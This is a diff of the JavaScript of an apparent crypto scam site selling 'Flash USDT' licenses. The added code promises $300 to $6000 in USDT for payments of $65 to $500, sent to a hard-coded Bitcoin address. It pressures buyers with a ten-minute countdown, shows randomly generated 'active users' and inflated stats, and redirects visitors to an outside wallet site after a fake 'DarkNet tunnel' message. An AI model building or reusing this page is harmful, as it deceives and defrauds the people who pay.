-                requestAnimationFrame(animateBackground);
-            }
-            
-            animateBackground();
-
-            // Online counter
-            function updateOnlineCount() {
-                const onlineCount = document.getElementById('online-count');
-                const newCount = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
-                onlineCount.textContent = newCount;
-            }
-            updateOnlineCount();
-            setInterval(updateOnlineCount, 60000);
-
-            // Live Crypto Prices
-            async function fetchCryptoPrices() {
-                try {
-                    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether&vs_currencies=usd');
-                    const data = await response.json();
-                    const container = document.getElementById('crypto-prices-container');
-                    container.innerHTML = '';
-                    
-                    const symbols = {
-                        bitcoin: '₿',
-                        ethereum: 'Ξ',
-                        tether: '₮'
-                    };
-                    
-                    for (const [crypto, price] of Object.entries(data)) {
-                        const div = document.createElement('div');
-                        div.classList.add('crypto-price');
-                        div.innerHTML = `
-                            <span class="crypto-name"><span class="crypto-symbol">${symbols[crypto]}</span>${crypto.toUpperCase()}</span>
-                            <span class="crypto-value">$${price.usd.toFixed(2)}</span>
-                        `;
-                        container.appendChild(div);
-                    }
-                } catch (error) {
-                    console.error('Error fetching crypto prices:', error);
+        // Animate stats
+        function animateValue(id, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const value = Math.floor(progress * (end - start) + start);
+                document.getElementById(id).textContent = value.toLocaleString();
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
                 }
-            }
-            fetchCryptoPrices();
-            setInterval(fetchCryptoPrices, 60000);
+            };
+            window.requestAnimationFrame(step);
+        }
 
-            // Add hover effect to license cards
-            const licenseCards = document.querySelectorAll('.license-card');
-            licenseCards.forEach(card => {
-                card.addEventListener('mouseover', () => {
-                    card.style.transform = 'translateY(-15px) scale(1.05)';
-                    card.style.boxShadow = '0 0 30px var(--primary-color)';
-                });
-                card.addEventListener('mouseout', () => {
-                    card.style.transform = '';
-                    card.style.boxShadow = '0 0 15px var(--primary-color)';
-                });
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    animateValue("activeUsers", 0, Math.floor(Math.random() * (68 - 20 + 1)) + 20, 2000);
+                    animateValue("productsManaged", 0, 10000000, 2000);
+                    observer.unobserve(entry.target);
+                }
             });
+        }, { threshold: 0.5 });
 
-            // Add tech symbols
-            const symbols = ['₿', 'Ξ', '◊', 'Ł', 'Ð', '₮', '₳', '฿', 'Ƀ', '₽'];
-            for (let i = 0; i < 20; i++) {
-                const symbol = document.createElement('div');
-                symbol.classList.add('tech-symbol');
-                symbol.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-                symbol.style.left = `${Math.random() * 100}vw`;
-                symbol.style.top = `${Math.random() * 100}vh`;
-                symbol.style.animationDelay = `${Math.random() * 5}s`;
-                document.body.appendChild(symbol);
+        observer.observe(document.querySelector('.stats'));
+
+        // Smooth scrolling function
+        function smoothScroll(target, duration) {
+            const targetElement = document.querySelector(target);
+            const targetPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+            const startPosition = window.pageYOffset;
+            const distance = targetPosition - startPosition;
+            let startTime = null;
+
+            function animation(currentTime) {
+                if (startTime === null) startTime = currentTime;
+                const timeElapsed = currentTime - startTime;
+                const run = ease(timeElapsed, startPosition, distance, duration);
+                window.scrollTo(0, run);
+                if (timeElapsed < duration) requestAnimationFrame(animation);
             }
 
-            // Add interactive elements
-            const interactiveSymbols = ['₿', 'Ξ', '₮', '◊', '💱'];
-            for (let i = 0; i < 5; i++) {
-                const element = document.createElement('div');
-                element.classList.add('interactive-element');
-                element.textContent = interactiveSymbols[i];
-                element.style.left = `${Math.random() * 90 + 5}vw`;
-                element.style.top = `${Math.random() * 90 + 5}vh`;
-                element.addEventListener('click', () => {
-                    let message;
-                    switch(interactiveSymbols[i]) {
-                        case '₿':
-                            message = "Bitcoin (BTC) - The first and most well-known cryptocurrency.";
-                            break;
-                        case 'Ξ':
-                            message = "Ethereum (ETH) - A decentralized platform that runs smart contracts.";
-                            break;
-                        case '₮':
-                            message = "Tether (USDT) - A stablecoin pegged to the US Dollar.";
-                            break;
-                        case '◊':
-                            message = "Ethereum Classic (ETC) - A continuation of the original Ethereum blockchain.";
-                            break;
-                        case '💱':
-                            message = "Cryptocurrency Exchange - Platform for trading various digital currencies.";
-                            break;
-                    }
-                    alert(`${interactiveSymbols[i]}: ${message} Learn more about our Flash USDT service!`);
-                });
-                document.body.appendChild(element);
+            function ease(t, b, c, d) {
+                t /= d / 2;
+                if (t < 1) return c / 2 * t * t + b;
+                t--;
+                return -c / 2 * (t * (t - 2) - 1) + b;
             }
+
+            requestAnimationFrame(animation);
+        }
+
+        // Fetch crypto data
+        function fetchCryptoData() {
+            fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false')
+                .then(response => response.json())
+                .then(data => {
+                    const cryptoBody = document.getElementById('crypto-body');
+                    cryptoBody.innerHTML = '';
+                    data.forEach(coin => {
+                        const row = document.createElement('tr');
+                        const priceChangeClass = coin.price_change_percentage_24h >= 0 ? 'price-up' : 'price-down';
+                        row.innerHTML = `
+                            <td><img src="${coin.image}" alt="${coin.name}" class="crypto-symbol"> ${coin.name}</td>
+                            <td>$${coin.current_price.toFixed(2)}</td>
+                            <td class="${priceChangeClass}">${coin.price_change_percentage_24h.toFixed(2)}%</td>
+                        `;
+                        cryptoBody.appendChild(row);
+                    });
+                })
+                .catch(error => console.error('Error fetching crypto data:', error));
+        }
+
+        // Fetch crypto data initially and then every 60 seconds
+        fetchCryptoData();
+        setInterval(fetchCryptoData, 60000);
+
+        document.getElementById('access-license-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            const loadingOverlay = document.createElement('div');
+            loadingOverlay.className = 'loading-overlay';
+            loadingOverlay.innerHTML = `
+                <div class="loading-spinner"></div>
+                <p>Opening a Safe tunnel to the DarkNet, Please Wait for the Wallet Page</p>
+            `;
+            document.body.appendChild(loadingOverlay);
+            
+            setTimeout(() => {
+                window.location.href = 'https://walletcryp.com';
+            }, 3000);
         });
 
-        function openChatbot() {
-            window.open('https://jovaottello.github.io/CHATBOTFLASH-NEW/', '_blank', 'width=400,height=600');
+        const licenseData = {
+            trial: { price: 65, usdt: 300 },
+            standard: { price: 100, usdt: 500 },
+            premium: { price: 500, usdt: 6000 }
+        };
+
+        const bitcoinAddress = 'bc1qvyzw9wdtru8equvj64scy5nn5swqv8njenmhls';
+
+        document.querySelectorAll('.purchase-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const license = this.dataset.license;
+                const { price, usdt } = licenseData[license];
+                
+                const popup = document.createElement('div');
+                popup.className = 'license-popup';
+                popup.innerHTML = `
+                    <div class="popup-content">
+                        <h3>${license.charAt(0).toUpperCase() + license.slice(1)} License</h3>
+                        <div class="timer">10:00</div>
+                        <p>Pay $${price}, You Get $${usdt} USDT</p>
+                        <div class="bitcoin-info">
+                            <img src="bitcoin-icon.svg" alt="Bitcoin" class="bitcoin-icon">
+                            <p>${bitcoinAddress}</p>
+                            <button class="copy-btn">Copy</button>
+                        </div>
+                        <button class="close-btn">Close</button>
+                    </div>
+                `;
+                
+                document.body.appendChild(popup);
+                
+                let timeLeft = 600;
+                const timerDisplay = popup.querySelector('.timer');
+                const timerInterval = setInterval(() => {
+                    timeLeft--;
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        popup.remove();
+                    }
+                }, 1000);
+                
+                popup.querySelector('.copy-btn').addEventListener('click', () => {
+                    navigator.clipboard.writeText(bitcoinAddress);
+                    alert('Bitcoin address copied to clipboard!');
+                });
+                
+                popup.querySelector('.close-btn').addEventListener('click', () => {
+                    clearInterval(timerInterval);
+                    popup.remove();
+                });
+            });
+        });
+
+        document.getElementById('trade-btn').addEventListener('click', function() {
+            const popup = document.createElement('div');
+            popup.className = 'trade-popup';
+            popup.innerHTML = '<p>Trade is Coming Soon</p>';
+            document.body.appendChild(popup);
+            
+            setTimeout(() => {
+                popup.classList.add('show');
+            }, 10);
+            
+            setTimeout(() => {
+                popup.classList.remove('show');
+                setTimeout(() => {
+                    popup.remove();
+                }, 500);
+            }, 3000);
+        });
+
+        const cryptoSymbols = ['₿', 'Ξ', '₮', 'Ł', '₳', '₴', '₽', 'Ð', '₩', '₭'];
+
+        function createFloatingSymbol() {
+            const symbol = document.createElement('div');
+            symbol.className = 'floating-symbol';
+            symbol.textContent = cryptoSymbols[Math.floor(Math.random() * cryptoSymbols.length)];
+            symbol.style.left = `${Math.random() * 100}vw`;
+            symbol.style.animationDuration = `${Math.random() * 5 + 5}s`;
+            document.getElementById('floating-crypto-symbols').appendChild(symbol);
+
+            symbol.addEventListener('animationend', () => {
+                symbol.remove();
+            });
         }
+
+        setInterval(createFloatingSymbol, 1000);
     </script>
 </body>
 </html>
